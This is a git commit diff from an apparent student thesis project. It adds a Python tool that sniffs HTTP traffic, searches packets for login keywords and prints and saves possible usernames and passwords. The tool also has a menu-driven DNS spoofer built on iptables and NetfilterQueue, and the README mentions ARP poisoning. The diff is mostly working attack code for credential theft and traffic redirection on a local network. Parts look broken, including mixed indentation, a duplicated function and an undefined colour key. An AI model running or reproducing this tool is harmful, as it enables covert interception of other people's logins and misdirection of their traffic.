ae9be32c415ffb6c13af119af85d73aa10b9c6b1
root <root@localhost.localdomain>
2018-11-22 19:05:21 -0500

    makeing monitor file and removing packet and dns Spoof file

--- README.md
+++ README.md
@@ -1,3 +1,8 @@
 # Thesis141
 
-## this program is for arp poison and For Packet Sniffer 
+## this program is for arp poison and For Packet Sniffer
+
+## ON debian or Ubuntu,install those file with 
+### apt install build-essential python-dev libnetfilter-queue-dev
+### pip install NetfilterQueue
+
--- monitor.py
+++ monitor.py
@@ -1,12 +1,15 @@
 #!/usr/bin/python
-from netfilterqueue import NetfilterQueue
 import scapy.all as scapy
 import os
 import re
 import sys
 import socket
 import terminal_banner
+from time import sleep
+from scapy_http import http
 from datetime import datetime
+from colorama import Fore,Back,Style
+from netfilterqueue import NetfilterQueue
 
 colors = {
 	'HEADER' : "\033[95m",
@@ -19,17 +22,46 @@ colors = {
 	'FAIL' : "\033[91m",
 	'ENDC' : "\033[0m",
 	'BOLD' : "\033[1m",
-	'UNDERLINE' : "\033[4m" 
+	'UNDERLINE' : "\033[4m" ,
+	'M' : '\033[1;35;32m' # magenta
 }
-
+# Packet Sniffing
 def FileName():
 	return  datetime.strftime(datetime.now(),'%Y-%m-%d-%H-%M-%S')
 
+def Sniff(interface):
+	scapy.sniff(iface=interface,store=False,prn=Prosess_sniffed_paceket)
+
+def Geturl(packet):
+	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
+def Get_login_info(packet):
+    if packet.haslayer(scapy.Raw):
+    	load = packet[scapy.Raw].load
+	keywords = ["username","user","login","password","pass","email","name","id","pPASS","Username","user_login","login_username","log","pwd"]
+	for keyword in keywords:
+	    if keyword in load:
+		return load
+				
+
+def Prosess_sniffed_paceket(packet):
+	if packet.haslayer(http.HTTPRequest):
+		website = Geturl(packet)
+		print(Fore.BLUE + "[+] HTTP Request >>" + str(website))
+	 	loginfo = Get_login_info(packet)
+	 	if loginfo:
+	 		file = open('data/log_' + FileName() + '.txt' ,'w+')
+	 		file.write(website + "\n\n\t" +loginfo)
+	 		print(Fore.RED + "\n\n\t [!] Possible Username/password >> " + loginfo + "\n\n\n")
+
+# DNS SPOOF
 def banner():
 	print(colors['HEADER'] +"")
 	banner_text ="\t\tThis Project is working DNS spoof \n\n \t\t\tAuther : name \n"
 	print(terminal_banner.Banner(banner_text))
 
+def FileName():
+	return  datetime.strftime(datetime.now(),'%Y-%m-%d-%H-%M-%S')
 register = {}
 
 def host_ip():
@@ -50,7 +82,6 @@ def read_file(path):
 				try:
 					key,value = line.split()
 					register[key] = value
-					# print(register[key].value)
 				except:
 					print(colors['FAIL'] + "Invalid File format <domain> <fake Ip address> "+ colors['ENDC'])
 					sys.exit(1)
@@ -80,8 +111,7 @@ def process_packet(pkt):
 				file.close()
 	pkt.accept()
 
-def main():
-	banner()
+def DnsMain():
 	os.system('iptables --flush')
 	os.system('iptables -I FORWARD -j NFQUEUE --queue-num 1')
 	path = raw_input(colors['OKBLUE']+"Enter File path: " + colors['ENDC'])
@@ -90,7 +120,28 @@ def main():
 
 	queue = NetfilterQueue()
 	queue.bind(1,process_packet)
-	queue.run()
+	try:
+		queue.run()
+	except KeyboardInterrupt:
+		print(colors['RED'] + "\n[!] DNS Spoofed is stoped"+colors['ENDC'])
+
+def main():
+	banner()
+	while True:
+		print(colors['GREEN']   + "\n\n\t 1. for Packet Sniffing"+colors['ENDC'])
+		sleep(0.1)
+		print(colors['OKYELLOW'] + "\t 2. for DNS Spoof "+colors['ENDC'])
+		sleep(0.1)
+		print(colors['RED'] +"\t 3. for Exit the Program"+colors['ENDC'])
+		sleep(0.2)
+		choices = int(input(colors['M'] + "Enter you Choices:"+colors['ENDC']))
+
+		if choices == 1:
+			Sniff("eth0")
+		elif choices ==2:
+			DnsMain()
+		elif choices ==3:
+			exit()
 
 if __name__ == '__main__':
 	main()
